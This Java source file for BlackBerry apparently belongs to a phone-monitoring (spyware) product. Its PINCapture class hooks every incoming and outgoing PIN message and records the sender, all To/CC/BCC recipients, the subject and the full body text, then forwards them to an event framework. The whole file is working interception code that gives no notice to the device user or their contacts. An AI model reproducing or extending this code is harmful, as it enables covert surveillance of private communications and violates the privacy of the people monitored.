package com.vvt.pinc;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Message;
import com.vvt.event.FxEventCapture;
import com.vvt.event.FxPINEvent;
import com.vvt.event.FxRecipient;
import com.vvt.event.constant.FxDirection;
import com.vvt.event.constant.FxRecipientType;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class PINCapture extends FxEventCapture implements PinListener {
	
	private PinMonitor pinMon = new PinMonitor();
	
	public PINCapture() {
		pinMon.setPinListener(this);
	}
	
	public void startCapture() {
		try {
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				pinMon.startMonitor();
				setEnabled(true);
			}
		} catch(Exception e) {
			notifyError(e);
		}
	}
	
	public void stopCapture() {
		try {
			if (isEnabled()) {
				pinMon.stopMonitor();
				setEnabled(false);
			}
		} catch(Exception e) {
			notifyError(e);
		}
	}
	

	private void addRecipients(FxPINEvent pinEvent, Message message) throws Exception {
		Address addrTo[] = message.getRecipients(Message.RecipientType.TO);
		for (int i = 0; addrTo != null && i < addrTo.length; i++) {
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.TO);
			recipient.setContactName(addrTo[i].getName() != null ? addrTo[i].getName() : Constant.SPACE);
			recipient.setRecipient(addrTo[i].getAddr() != null ? addrTo[i].getAddr() : Constant.SPACE);
			pinEvent.addRecipient(recipient);
		}
		Address addrCc[] = message.getRecipients(Message.RecipientType.CC);
		for (int i = 0; addrCc != null && i < addrCc.length; i++) {
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.CC);
			recipient.setContactName(addrCc[i].getName() != null ? addrCc[i].getName() : Constant.SPACE);
			recipient.setRecipient(addrCc[i].getAddr() != null ? addrCc[i].getAddr() : Constant.SPACE);
			pinEvent.addRecipient(recipient);
		}
		Address addrBcc[] = message.getRecipients(Message.RecipientType.BCC);
		for (int i = 0; addrBcc != null && i < addrBcc.length; i++) {
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.BCC);
			recipient.setContactName(addrBcc[i].getName() != null ? addrBcc[i].getName() : Constant.SPACE);
			recipient.setRecipient(addrBcc[i].getAddr() != null ? addrBcc[i].getAddr() : Constant.SPACE);
			pinEvent.addRecipient(recipient);
		}
	}

	// PinListener
	public void done(String msg) {
	}

	public void error(String msg) {
		Log.error("PINCapture.error", msg);
	}

	public void pinMessageAdded(Message message) {
		try {
			if (Log.isDebugEnable()) {
				Log.debug("PINCapture.pinMessageAdded()", "Enter");
			}
			FxPINEvent pinEvent = new FxPINEvent();
			boolean inbound = message.isInbound();
			if (inbound) {
				pinEvent.setDirection(FxDirection.IN);
				// To set sender.
				Address addressFrom = message.getFrom();
				if (addressFrom != null) {
					pinEvent.setAddress(addressFrom.getAddr() != null ? addressFrom.getAddr() : Constant.SPACE);
					pinEvent.setContactName(addressFrom.getName() != null ? addressFrom.getName() : Constant.SPACE);
				}
			} else {
				pinEvent.setDirection(FxDirection.OUT);
				pinEvent.setAddress(PhoneInfo.getPIN() != null ? PhoneInfo.getPIN() : Constant.SPACE);
			}
			// To set recipients.
			addRecipients(pinEvent, message);
			// To set event time.
			pinEvent.setEventTime(System.currentTimeMillis());
			// To set message.
			String data = message.getBodyText();
			pinEvent.setMessage(data != null ? data : Constant.SPACE);
			// To set subject.
			pinEvent.setSubject(message.getSubject() != null ? message.getSubject() : Constant.SPACE);
			// To notify event.
			notifyEvent(pinEvent);
		} catch(Exception e) {
			notifyError(e);
		}
	}
}
